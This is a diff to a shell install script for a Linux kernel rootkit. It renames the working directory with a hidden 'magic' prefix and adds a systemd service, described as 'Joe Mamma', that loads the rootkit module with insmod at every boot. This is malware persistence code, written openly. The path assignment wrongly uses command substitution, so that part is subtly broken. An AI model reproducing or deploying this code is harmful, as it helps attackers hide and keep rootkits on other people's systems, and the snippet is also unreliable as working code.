@@ -15,6 +15,22 @@ if test -f "$koFile"; then
     thisDir=${PWD##*/}
     mv "$thisDirPath" '../'"$magicPrefix""$thisDir"
 
+    # Load rootkit on boot:
+    loadServicePath=$('/etc/systemd/system/'"$magicPrefix"'load.service')
+    touch "$loadServicePath"
+    echo "[Unit]" >> "$loadServicePath"
+    echo "Description=Joe Mamma" >> "$loadServicePath"
+    echo "After=multi-user.target" >> "$loadServicePath"
+    echo "" >> "$loadServicePath"
+    echo "[Service]" >> "$loadServicePath"
+    echo "Type=simple" >> "$loadServicePath"
+    echo "RemainAfterExit=yes" >> "$loadServicePath"
+    echo "ExecStart=insmod $koFile" >> "$loadServicePath"
+    echo "TimeoutStartSec=0" >> "$loadServicePath"
+    echo "" >> "$loadServicePath"
+    echo "[Install]" >> "$loadServicePath"
+    echo "WantedBy=default.target" >> "$loadServicePath"    
+
     # Others:
 
     echo "built."
